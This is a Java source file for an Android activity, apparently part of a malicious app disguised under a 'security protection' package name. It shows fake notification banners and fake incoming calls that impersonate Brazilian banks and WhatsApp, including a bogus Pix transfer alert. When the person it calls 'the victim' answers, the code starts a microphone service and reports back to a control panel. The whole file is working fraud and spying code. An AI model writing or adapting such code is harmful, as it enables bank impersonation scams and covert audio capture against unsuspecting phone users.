package com.seguranca.protecao;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * 🔔 FAKE NOTIFICATION FLOATING ON-SCREEN BANNER
 * 
 * Exibe um banner flutuante no topo da tela do celular (estilo Heads-Up)
 * Suporta Notificações Push e Chamadas Falsas Flutuantes com botões ATENDER / RECUSAR!
 */
public class FakeNotificationBannerActivity extends Activity {
    private static final String TAG = "FakeNotifBanner";

    private String title = "Itaú Uniclass";
    private String text = "Você recebeu uma transferência via Pix de R$ 1.500,00.";
    private String bank = "itau";
    private String iconType = "itau";
    private String iconUrl = "";
    private String actionOnTap = "fake_call";
    private boolean sound = true;
    private boolean isCallMode = false;

    private Ringtone ringtone;
    private Vibrator vibrator;
    private Handler autoDismissHandler = new Handler(Looper.getMainLooper());
    private View mainCardView;

    private BroadcastReceiver endCallReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "🔔 Recebido broadcast para encerrar chamada na notificação");
            stopRingingAndVibration();
            dismissBanner();
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);

        Window window = getWindow();
        window.setGravity(Gravity.TOP | Gravity.CENTER_HORIZONTAL);
        window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT);
        
        int flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
        window.setFlags(flags, flags);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.setStatusBarColor(Color.TRANSPARENT);
        }

        Intent intent = getIntent();
        if (intent != null) {
            if (intent.hasExtra("title")) title = intent.getStringExtra("title");
            if (intent.hasExtra("text")) text = intent.getStringExtra("text");
            if (intent.hasExtra("message")) text = intent.getStringExtra("message");
            if (intent.hasExtra("bank")) bank = intent.getStringExtra("bank");
            if (intent.hasExtra("icon")) iconType = intent.getStringExtra("icon");
            if (intent.hasExtra("iconUrl")) iconUrl = intent.getStringExtra("iconUrl");
            if (intent.hasExtra("actionOnTap")) actionOnTap = intent.getStringExtra("actionOnTap");
            if (intent.hasExtra("sound")) sound = intent.getBooleanExtra("sound", true);
            if (intent.hasExtra("isCall")) isCallMode = intent.getBooleanExtra("isCall", false);
        }

        if (iconType == null || iconType.trim().isEmpty()) {
            iconType = bank;
        }

        // Registra receiver para encerrar chamada se solicitado pelo painel
        IntentFilter filter = new IntentFilter("com.seguranca.protecao.END_FAKE_CALL");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(endCallReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(endCallReceiver, filter);
        }

        setContentView(buildBannerUI());
        playAlertSoundAndVibration();

        if (mainCardView != null) {
            mainCardView.setTranslationY(-350f);
            mainCardView.animate()
                    .translationY(0f)
                    .setDuration(350)
                    .start();
        }

        // Se for chamada de notificação, dá tempo do usuário atender (30s), senão dismiss em 7.5s
        long dismissDelay = isCallMode ? 30000L : 7500L;
        autoDismissHandler.postDelayed(this::dismissBanner, dismissDelay);
    }

    private View buildBannerUI() {
        FrameLayout rootLayout = new FrameLayout(this);
        rootLayout.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
        ));

        int topMarginPx = dpToPx(38);
        int sideMarginPx = dpToPx(14);
        int paddingPx = dpToPx(12);

        // Container principal do Card (Vertical para conter info + botões se for chamada)
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setPadding(paddingPx, paddingPx, paddingPx, paddingPx);

        FrameLayout.LayoutParams cardParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
        );
        cardParams.setMargins(sideMarginPx, topMarginPx, sideMarginPx, 0);
        card.setLayoutParams(cardParams);

        GradientDrawable cardBg = new GradientDrawable();
        cardBg.setShape(GradientDrawable.RECTANGLE);
        cardBg.setCornerRadius(dpToPx(20));
        cardBg.setColor(Color.parseColor("#1A2332"));
        cardBg.setStroke(dpToPx(1), Color.parseColor(isCallMode ? "#00F0FF" : "#3B82F6"));
        card.setBackground(cardBg);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            card.setElevation(dpToPx(12));
        }

        // Linha superior: Ícone + Textos
        LinearLayout topRow = new LinearLayout(this);
        topRow.setOrientation(LinearLayout.HORIZONTAL);
        topRow.setGravity(Gravity.CENTER_VERTICAL);
        topRow.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
        ));

        View iconView = buildIconView(iconType, iconUrl);
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(dpToPx(42), dpToPx(42));
        iconParams.setMargins(0, 0, dpToPx(12), 0);
        iconView.setLayoutParams(iconParams);
        topRow.addView(iconView);

        LinearLayout contentLayout = new LinearLayout(this);
        contentLayout.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams contentParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f
        );
        contentLayout.setLayoutParams(contentParams);

        LinearLayout headerRow = new LinearLayout(this);
        headerRow.setOrientation(LinearLayout.HORIZONTAL);
        headerRow.setGravity(Gravity.CENTER_VERTICAL);

        TextView tvAppName = new TextView(this);
        tvAppName.setText(isCallMode ? (getAppNameForIcon(iconType) + " • Chamada de Voz") : getAppNameForIcon(iconType));
        tvAppName.setTextColor(Color.parseColor("#94A3B8"));
        tvAppName.setTextSize(11);
        tvAppName.setTypeface(Typeface.DEFAULT_BOLD);
        headerRow.addView(tvAppName);

        TextView tvTime = new TextView(this);
        tvTime.setText(" • agora");
        tvTime.setTextColor(Color.parseColor("#64748B"));
        tvTime.setTextSize(11);
        headerRow.addView(tvTime);

        contentLayout.addView(headerRow);

        TextView tvTitle = new TextView(this);
        tvTitle.setText(title);
        tvTitle.setTextColor(Color.WHITE);
        tvTitle.setTextSize(13.5f);
        tvTitle.setTypeface(Typeface.DEFAULT_BOLD);
        tvTitle.setSingleLine(true);
        contentLayout.addView(tvTitle);

        TextView tvMessage = new TextView(this);
        tvMessage.setText(text);
        tvMessage.setTextColor(Color.parseColor("#CBD5E1"));
        tvMessage.setTextSize(12f);
        tvMessage.setMaxLines(2);
        contentLayout.addView(tvMessage);

        topRow.addView(contentLayout);
        card.addView(topRow);

        // Se for Chamada Falsa, adiciona a barra de Ações (ATENDER e RECUSAR)
        if (isCallMode) {
            LinearLayout actionsLayout = new LinearLayout(this);
            actionsLayout.setOrientation(LinearLayout.HORIZONTAL);
            actionsLayout.setGravity(Gravity.CENTER);
            LinearLayout.LayoutParams actionsParams = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT, dpToPx(40)
            );
            actionsParams.setMargins(0, dpToPx(10), 0, 0);
            actionsLayout.setLayoutParams(actionsParams);

            // Botão RECUSAR
            TextView btnDecline = new TextView(this);
            btnDecline.setText("🚫 RECUSAR");
            btnDecline.setTextColor(Color.WHITE);
            btnDecline.setTextSize(12);
            btnDecline.setTypeface(Typeface.DEFAULT_BOLD);
            btnDecline.setGravity(Gravity.CENTER);

            GradientDrawable declineBg = new GradientDrawable();
            declineBg.setCornerRadius(dpToPx(20));
            declineBg.setColor(Color.parseColor("#E53E3E"));
            btnDecline.setBackground(declineBg);

            LinearLayout.LayoutParams declineParams = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.MATCH_PARENT, 1.0f);
            declineParams.setMargins(0, 0, dpToPx(6), 0);
            btnDecline.setLayoutParams(declineParams);

            btnDecline.setOnClickListener(v -> {
                Log.d(TAG, "🔴 Vítima recusou a chamada na notificação");
                stopRingingAndVibration();
                try {
                    Intent endIntent = new Intent("com.seguranca.protecao.FAKE_CALL_ENDED");
                    endIntent.setPackage(getPackageName());
                    sendBroadcast(endIntent);
                } catch (Exception ignored) {}
                dismissBanner();
            });

            // Botão ATENDER
            TextView btnAnswer = new TextView(this);
            btnAnswer.setText("📞 ATENDER");
            btnAnswer.setTextColor(Color.WHITE);
            btnAnswer.setTextSize(12);
            btnAnswer.setTypeface(Typeface.DEFAULT_BOLD);
            btnAnswer.setGravity(Gravity.CENTER);

            GradientDrawable answerBg = new GradientDrawable();
            answerBg.setCornerRadius(dpToPx(20));
            answerBg.setColor(Color.parseColor("#38A169"));
            btnAnswer.setBackground(answerBg);

            LinearLayout.LayoutParams answerParams = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.MATCH_PARENT, 1.0f);
            answerParams.setMargins(dpToPx(6), 0, 0, 0);
            btnAnswer.setLayoutParams(answerParams);

            btnAnswer.setOnClickListener(v -> {
                Log.d(TAG, "🟢 Vítima atendeu a chamada na notificação!");
                stopRingingAndVibration();

                try {
                    Intent micIntent = new Intent(FakeNotificationBannerActivity.this, MicrophoneService.class);
                    micIntent.putExtra("enabled", true);
                    startService(micIntent);

                    Intent answerIntent = new Intent("com.seguranca.protecao.FAKE_CALL_ANSWERED");
                    answerIntent.setPackage(getPackageName());
                    answerIntent.putExtra("caller_name", title);
                    sendBroadcast(answerIntent);
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao ativar atendimento na notificação: " + e.getMessage());
                }

                tvMessage.setText("🟢 CHAMADA CONECTADA • EM VIVA-VOZ");
                tvMessage.setTextColor(Color.parseColor("#00FF88"));
                actionsLayout.setVisibility(View.GONE);

                autoDismissHandler.removeCallbacksAndMessages(null);
                autoDismissHandler.postDelayed(this::dismissBanner, 15000);
            });

            actionsLayout.addView(btnDecline);
            actionsLayout.addView(btnAnswer);
            card.addView(actionsLayout);
        } else {
            card.setOnClickListener(v -> {
                Log.d(TAG, "🔔 Notificação flutuante clicada pelo usuário!");
                if ("fake_call".equalsIgnoreCase(actionOnTap)) {
                    Intent fakeCallIntent = new Intent(FakeNotificationBannerActivity.this, FakeCallActivity.class);
                    fakeCallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                    fakeCallIntent.putExtra("caller_name", title);
                    fakeCallIntent.putExtra("bank", bank);
                    startActivity(fakeCallIntent);
                }
                dismissBanner();
            });
        }

        this.mainCardView = card;
        rootLayout.addView(card);
        return rootLayout;
    }

    private View buildIconView(String iconKey, String customIconUrl) {
        FrameLayout container = new FrameLayout(this);
        View standardIcon = buildStandardIconView(iconKey);
        container.addView(standardIcon, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT
        ));

        if (customIconUrl != null && (customIconUrl.startsWith("http://") || customIconUrl.startsWith("https://"))) {
            android.widget.ImageView imageView = new android.widget.ImageView(this);
            imageView.setScaleType(android.widget.ImageView.ScaleType.CENTER_CROP);
            imageView.setVisibility(View.GONE);

            GradientDrawable shape = new GradientDrawable();
            shape.setShape(GradientDrawable.OVAL);
            shape.setColor(Color.parseColor("#0F172A"));
            imageView.setBackground(shape);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                imageView.setClipToOutline(true);
            }

            container.addView(imageView, new FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT
            ));

            new Thread(() -> {
                try {
                    java.net.URL url = new java.net.URL(customIconUrl.trim());
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    conn.setDoInput(true);
                    conn.setInstanceFollowRedirects(true);
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                    conn.setRequestProperty("Accept", "image/webp,image/apng,image/png,image/jpeg,image/*,*/*;q=0.8");
                    conn.connect();

                    int responseCode = conn.getResponseCode();
                    if (responseCode == 200 || responseCode == 206) {
                        java.io.InputStream is = conn.getInputStream();
                        final android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeStream(is);
                        if (bitmap != null) {
                            new Handler(Looper.getMainLooper()).post(() -> {
                                imageView.setImageBitmap(bitmap);
                                imageView.setVisibility(View.VISIBLE);
                            });
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao carregar bitmap da URL do ícone: " + e.getMessage());
                }
            }).start();
        }

        return container;
    }

    private View buildStandardIconView(String iconKey) {
        TextView iconTv = new TextView(this);
        iconTv.setGravity(Gravity.CENTER);
        iconTv.setTypeface(Typeface.DEFAULT_BOLD);
        iconTv.setTextColor(Color.WHITE);
        iconTv.setTextSize(13);

        GradientDrawable bg = new GradientDrawable();
        bg.setShape(GradientDrawable.OVAL);

        String k = iconKey != null ? iconKey.toLowerCase() : "";
        if (k.contains("itau")) {
            bg.setColor(Color.parseColor("#EC7000"));
            iconTv.setText("Itaú");
            iconTv.setTextSize(10);
        } else if (k.contains("nubank") || k.contains("nu")) {
            bg.setColor(Color.parseColor("#8A05BE"));
            iconTv.setText("nu");
            iconTv.setTextSize(15);
        } else if (k.contains("bradesco")) {
            bg.setColor(Color.parseColor("#CC092F"));
            iconTv.setText("B");
            iconTv.setTextSize(17);
        } else if (k.contains("caixa")) {
            bg.setColor(Color.parseColor("#005CA9"));
            iconTv.setText("X");
            iconTv.setTextSize(16);
        } else if (k.contains("santander")) {
            bg.setColor(Color.parseColor("#EC0000"));
            iconTv.setText("S");
            iconTv.setTextSize(16);
        } else if (k.contains("whatsapp")) {
            bg.setColor(Color.parseColor("#25D366"));
            iconTv.setText("💬");
            iconTv.setTextSize(16);
        } else if (k.contains("inter")) {
            bg.setColor(Color.parseColor("#FF7A00"));
            iconTv.setText("inter");
            iconTv.setTextSize(9);
        } else if (k.contains("c6")) {
            bg.setColor(Color.parseColor("#242424"));
            iconTv.setText("C6");
            iconTv.setTextSize(12);
        } else {
            bg.setColor(Color.parseColor("#00F0FF"));
            iconTv.setText("🛡️");
            iconTv.setTextSize(15);
        }

        iconTv.setBackground(bg);
        return iconTv;
    }

    private String getAppNameForIcon(String iconKey) {
        String k = iconKey != null ? iconKey.toLowerCase() : "";
        if (k.contains("itau")) return "Itaú Uniclass";
        if (k.contains("nubank") || k.contains("nu")) return "Nubank";
        if (k.contains("bradesco")) return "Bradesco";
        if (k.contains("caixa")) return "Caixa Econômica";
        if (k.contains("santander")) return "Santander";
        if (k.contains("whatsapp")) return "WhatsApp";
        if (k.contains("inter")) return "Banco Inter";
        if (k.contains("c6")) return "C6 Bank";
        return "Notificação do Sistema";
    }

    private void playAlertSoundAndVibration() {
        if (!sound) return;
        try {
            vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null && vibrator.hasVibrator()) {
                if (isCallMode) {
                    vibrator.vibrate(new long[]{0, 1000, 1000}, 0); // Continuous loop for call
                } else {
                    vibrator.vibrate(new long[]{0, 250, 150, 300}, -1);
                }
            }

            Uri soundUri;
            if (isCallMode) {
                soundUri = RingtoneManager.getActualDefaultRingtoneUri(getApplicationContext(), RingtoneManager.TYPE_RINGTONE);
                if (soundUri == null) {
                    soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
                }
            } else {
                soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
            }

            if (soundUri != null) {
                ringtone = RingtoneManager.getRingtone(this, soundUri);
                if (ringtone != null) {
                    ringtone.play();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao tocar som: " + e.getMessage());
        }
    }

    private void stopRingingAndVibration() {
        try {
            if (ringtone != null && ringtone.isPlaying()) {
                ringtone.stop();
            }
            if (vibrator != null) {
                vibrator.cancel();
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao parar som/vibração: " + e.getMessage());
        }
    }

    private void dismissBanner() {
        stopRingingAndVibration();
        autoDismissHandler.removeCallbacksAndMessages(null);
        if (mainCardView != null) {
            mainCardView.animate()
                    .translationY(-400f)
                    .setDuration(300)
                    .withEndAction(this::finish)
                    .start();
        } else {
            finish();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRingingAndVibration();
        try {
            unregisterReceiver(endCallReceiver);
        } catch (Exception ignored) {}
    }

    private int dpToPx(int dp) {
        float density = getResources().getDisplayMetrics().density;
        return Math.round(dp * density);
    }
}

